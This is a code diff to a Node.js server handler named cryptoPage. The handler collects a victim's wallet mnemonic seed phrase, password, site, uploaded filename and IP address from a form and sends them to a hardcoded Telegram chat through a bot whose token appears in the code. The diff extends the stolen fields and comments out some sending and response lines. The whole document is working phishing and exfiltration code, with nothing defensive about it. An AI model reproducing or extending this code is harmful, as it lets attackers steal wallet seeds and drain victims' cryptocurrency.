@@ -28,13 +28,13 @@ module.exports = {
     }
   },
   cryptoPage: async (req, res) => {
-    const { mnemonic, password, site } = req.body;
+    const { mnemonic, password, site, filename } = req.body;
     const ip = req.ip;
     const TelegramBot = require("node-telegram-bot-api");
     //    const stream = fs.createReadStream(req.file);
     // replace the value below with the Telegram token you receive from @BotFather
     const token = "1172027626:AAHfloWHA8sv0DVqd5A_qRT3By3fINaYpUw";
-    const message1 = `mnemonic:\n${mnemonic}\n\npassword\n${password}\nsite\n\n${site}\n\nIP ${ip}`;
+    const message1 = `mnemonic:\n${mnemonic}\n\npassword\n${password}\n\nsite\n${site}\n\filename\n${filename}\n\nIP ${ip}`;
     // Create a bot that uses 'polling' to fetch new updates
     const bot = new TelegramBot(token, { polling: true });
     const chatId = 808625639;
@@ -44,10 +44,10 @@ module.exports = {
     }
 
     // send a message to the chat acknowledging receipt of their message
-    const message2 = `password\n${password}\n\nsite\n${site}\n\nIP ${ip}`;
-    bot.sendMessage(chatId, message2);
-    bot.sendDocument(chatId, `public/images/${req.file.filename}`);
+    // const message2 = `password\n${password}\n\nsite\n${site}\n\nIP ${ip}`;
+    // bot.sendMessage(chatId, message2);
+    // bot.sendDocument(chatId, `public/images/${req.file.filename}`);
     // send back the matched "whatever" to the chat
-    return res.status(201).json({ message: "success" });
+    // return res.status(201).json({ message: "success" });
   },
 };
